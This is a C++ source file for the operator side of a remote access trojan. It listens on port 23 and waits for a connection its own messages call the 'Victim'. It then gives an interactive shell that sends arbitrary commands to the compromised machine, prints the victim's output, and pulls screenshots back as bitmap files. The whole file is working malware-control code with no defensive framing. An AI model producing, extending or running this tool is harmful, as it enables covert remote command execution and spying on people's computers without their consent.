#include <iostream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <cstring>
#include <fstream>

#define PORT 23  // Port to listen on
#define BUFFER_SIZE 1024  // Buffer for receiving data

using namespace std;

int setup_server() {
    int server_fd;
    struct sockaddr_in address;

    // Create socket
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd == 0) {
        cerr << "Socket creation failed" << endl;
        return -1;
    }

    // Configure address
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    // Bind socket
    bind(server_fd, (struct sockaddr*)&address, sizeof(address));

    // Listen for connections
    if (listen(server_fd, 3) < 0) {
        cerr << "Listening failed" << endl;
        return -1;
    }

    cout << "Waiting for incoming connection on port " << PORT << "..." << endl;
    return server_fd;
}

int accept_connection(int server_fd) {
    struct sockaddr_in address;
    socklen_t addrlen = sizeof(address);

    int new_socket = accept(server_fd, (struct sockaddr*)&address, &addrlen);
    if (new_socket < 0) {
        cerr << "Accepting connection failed" << endl;
        return -1;
    }

    cout << "Victim connected" << endl;
    return new_socket;
}

void receive_file(int client_socket, const char* filename) {
    uint32_t fileSizeNetwork;
    if (recv(client_socket, (char*)&fileSizeNetwork, sizeof(fileSizeNetwork), 0) <= 0) {
        cerr << "Failed to receive file size." << endl;
        return;
    }

    // Convert from network byte order to host byte order
    size_t fileSize = ntohl(fileSizeNetwork);
    //if (fileSize <= 0 || fileSize > 10000000) { // Prevent extremely large files
    //    cerr << "Invalid file size received: " << fileSize << " bytes" << endl;
    //    return;
    //}

    cout << "Receiving file of size: " << fileSize << " bytes..." << endl;

    char* fileBuffer = new char[fileSize];
    size_t totalReceived = 0;
    
    while (totalReceived < fileSize) {
        int bytesReceived = recv(client_socket, fileBuffer + totalReceived, fileSize - totalReceived, 0);
        if (bytesReceived <= 0) {
            cerr << "Error: Failed to receive full file data. Received only " << totalReceived << " bytes." << endl;
            delete[] fileBuffer;
            return;
        }
        totalReceived += bytesReceived;
    }

    cout << "Successfully received " << totalReceived << " bytes." << endl;

    // Write file to disk
    ofstream outFile(filename, ios::binary);
    outFile.write(fileBuffer, totalReceived);
    outFile.close();
    delete[] fileBuffer;

    cout << "Screenshot saved as: " << filename << endl;
}

void free_navigate(int client_socket) {
    char buffer[BUFFER_SIZE] = {0};

    while (true) {
        cout << "[Shell] $ ";
        string command;
        getline(cin, command);

        if (command == "!stop") {
            return;
        }

        // Send command to victim
        send(client_socket, command.c_str(), command.length(), 0);

        // If the command is "screenshot", prepare to receive a file
        if (command == "screenshot") {
            receive_file(client_socket, "received_screenshot.bmp");
            continue;
        }

        // Receive response
        memset(buffer, 0, BUFFER_SIZE);
        int bytesReceived = recv(client_socket, buffer, BUFFER_SIZE, 0);
        if (bytesReceived <= 0) {
            cerr << "Connection lost!" << endl;
            break;
        }

        // Print the received output
        cout << "Victim: " << buffer << endl;
    }

    close(client_socket);
}

int main() {
    int server_fd = setup_server();
    if (server_fd < 0) return -1;

    int client_socket = accept_connection(server_fd);
    if (client_socket < 0) return -1;

    while (true){
        cout << "1 <- Shell" << endl;
        cout << "9 <- Close connection" << endl;
        cout << "$ ";
        string command;
        getline(cin, command);

        if (command == "1") {
            free_navigate(client_socket);
        }
        else if (command == "9") {
            cout << "Closing connection..." << endl;
            send(client_socket, "exit", 4, 0);
            close(server_fd);
            return 0;
        }
    }
    return 0;
}